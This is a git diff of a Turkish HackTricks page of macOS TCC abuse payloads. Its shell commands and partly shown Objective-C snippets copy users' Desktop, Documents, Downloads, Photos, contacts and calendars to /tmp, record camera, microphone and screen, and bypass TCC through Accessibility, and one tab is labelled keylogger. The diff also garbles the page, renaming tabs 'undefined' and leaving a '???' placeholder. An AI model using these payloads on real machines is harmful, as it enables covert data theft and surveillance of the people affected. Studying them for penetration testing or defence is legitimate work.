@@ -1,4 +1,4 @@
-# macOS TCC Yükleri
+# macOS TCC Payloads
 
 <details>
 
@@ -9,7 +9,7 @@ HackTricks'i desteklemenin diğer yolları:
 * Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u **takip edin**.
 * Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.
 
 </details>
@@ -22,6 +22,7 @@ HackTricks'i desteklemenin diğer yolları:
 {% tabs %}
 {% tab title="ObjetiveC" %}
 `$HOME/Desktop`'i `/tmp/desktop`'a kopyala.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -57,6 +58,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 `$HOME/Desktop`'i `/tmp/desktop`'a kopyalayın.
+
 ```bash
 cp -r "$HOME/Desktop" "/tmp/desktop"
 ```
@@ -71,6 +73,7 @@ cp -r "$HOME/Desktop" "/tmp/desktop"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 `$HOME/Documents`'ı `/tmp/documents` dizinine kopyala.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -106,6 +109,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 `$HOME/`Documents klasörünü `/tmp/documents` klasörüne kopyalayın.
+
 ```bash
 cp -r "$HOME/Documents" "/tmp/documents"
 ```
@@ -118,8 +122,11 @@ cp -r "$HOME/Documents" "/tmp/documents"
 * **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`
 
 {% tabs %}
-{% tab title="ObjetiveC" %}
+{% tab title="undefined" %}
 `$HOME/Downloads` klasörünü `/tmp/downloads` klasörüne kopyala.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -151,8 +158,11 @@ NSLog(@"Copy completed successfully.", error);
 fclose(stderr); // Close the file stream
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 `$HOME/Dowloads`'ı `/tmp/downloads` dizinine kopyalayın.
+
 ```bash
 cp -r "$HOME/Downloads" "/tmp/downloads"
 ```
@@ -167,6 +177,7 @@ cp -r "$HOME/Downloads" "/tmp/downloads"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 `$HOME/Pictures/Photos Library.photoslibrary`'yi `/tmp/photos` dizinine kopyalayın.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -202,6 +213,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 `$HOME/Pictures/Photos Library.photoslibrary` dosyasını `/tmp/photos` dizinine kopyalayın.
+
 ```bash
 cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 ```
@@ -216,6 +228,7 @@ cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
 {% tabs %}
 {% tab title="ObjetiveC" %}
 `$HOME/Library/Application Support/AddressBook`'u `/tmp/contacts` dizinine kopyalayın.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -251,6 +264,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 `$HOME/Library/Application Support/AddressBook`'u `/tmp/contacts` dizinine kopyalayın.
+
 ```bash
 cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 ```
@@ -265,6 +279,7 @@ cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
 {% tabs %}
 {% tab title="ObjectiveC" %}
 `$HOME/Library/Calendars`'ı `/tmp/calendars` dizinine kopyalayın.
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -300,12 +315,15 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 `$HOME/Library/Calendars`'ı `/tmp/calendars` dizinine kopyalayın.
+
 ```bash
 cp -r "$HOME/Library/Calendars" "/tmp/calendars"
 ```
+
 {% tabs %}
 {% tab title="ObjetiveC - Kayıt" %}
 3 saniyelik bir video kaydedin ve **`/tmp/recording.mov`** dizinine kaydedin.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -385,6 +403,7 @@ fclose(stderr); // Close the file stream
 
 {% tab title="ObjectiveC - Kontrol" %}
 Kameraya erişimi olan programı kontrol edin.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -418,20 +437,24 @@ fclose(stderr); // Close the file stream
 
 {% tab title="Shell" %}
 Kamerayla fotoğraf çekin
+
 ```bash
 ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
 ```
 {% endtab %}
 {% endtabs %}
 
-### Mikrofon
+#### Mikrofon
 
 * **Yetkilendirme**: **com.apple.security.device.audio-input**
 * **TCC**: `kTCCServiceMicrophone`
 
 {% tabs %}
-{% tab title="ObjetiveC - Kayıt" %}
+{% tab title="undefined" %}
 5 saniye ses kaydedin ve `/tmp/recording.m4a`'ya kaydedin.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -528,8 +551,13 @@ AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];
 fclose(stderr); // Close the file stream
 }
 ```
-{% tab title="ObjectiveC - Kontrol" %}
+{% endtab %}
+
+{% tab title="undefined" %}
 Uygulamanın mikrofona erişimi olup olmadığını kontrol edin.
+{% endtab %}
+
+{% tab title="undefined" %}
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -557,8 +585,11 @@ static void telegram(int argc, const char **argv) {
 [MicrophoneAccessChecker hasMicrophoneAccess];
 }
 ```
+{% endtab %}
+
 {% tab title="Shell" %}
 5 saniyelik bir ses kaydı yapın ve `/tmp/recording.wav` dosyasına kaydedin.
+
 ```bash
 # Check the microphones
 ffmpeg -f avfoundation -list_devices true -i ""
@@ -568,7 +599,7 @@ ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
 {% endtab %}
 {% endtabs %}
 
-### Konum
+#### Konum
 
 {% hint style="success" %}
 Bir uygulamanın konumu alabilmesi için, **Gizlilik ve Güvenlik** bölümünden **Konum Hizmetleri**nin etkinleştirilmiş olması gerekmektedir. Aksi takdirde, konuma erişilemez.
@@ -580,6 +611,7 @@ Bir uygulamanın konumu alabilmesi için, **Gizlilik ve Güvenlik** bölümünde
 {% tabs %}
 {% tab title="ObjectiveC" %}
 Konumu `/tmp/logs.txt` dosyasına yazın
+
 ```objectivec
 #include <syslog.h>
 #include <stdio.h>
@@ -630,13 +662,14 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
 {% tab title="Shell" %}
 Konuma erişim sağla
+
 ```
 ???
 ```
 {% endtab %}
 {% endtabs %}
 
-### Ekran Kaydı
+#### Ekran Kaydı
 
 * **Yetkilendirme**: Yok
 * **TCC**: `kTCCServiceScreenCapture`
@@ -644,6 +677,7 @@ Konuma erişim sağla
 {% tabs %}
 {% tab title="ObjectiveC" %}
 Ana ekranı `/tmp/screen.mov` dosyasına 5 saniye kaydedin.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <AVFoundation/AVFoundation.h>
@@ -701,18 +735,20 @@ freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
 
 {% tab title="Shell" %}
 Ana ekranı 5 saniye boyunca kaydet.
+
 ```bash
 screencapture -V 5 /tmp/screen.mov
 ```
 {% endtab %}
 {% endtabs %}
 
-### Erişilebilirlik
+#### Erişilebilirlik
 
 * **Yetkilendirme**: Yok
 * **TCC**: `kTCCServiceAccessibility`
 
 Finder'ın enter tuşuna basarak kontrolünü kabul etmek ve bu şekilde TCC'yi atlamak için TCC ayrıcalığını kullanın.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -767,6 +803,7 @@ return 0;
 
 {% tab title="Keylogger" %}
 Basılan tuşları **`/tmp/keystrokes.txt`** dosyasında saklayın.
+
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <ApplicationServices/ApplicationServices.h>
@@ -886,7 +923,7 @@ HackTricks'i desteklemenin diğer yolları:
 * Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
 * Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.
 
 </details>
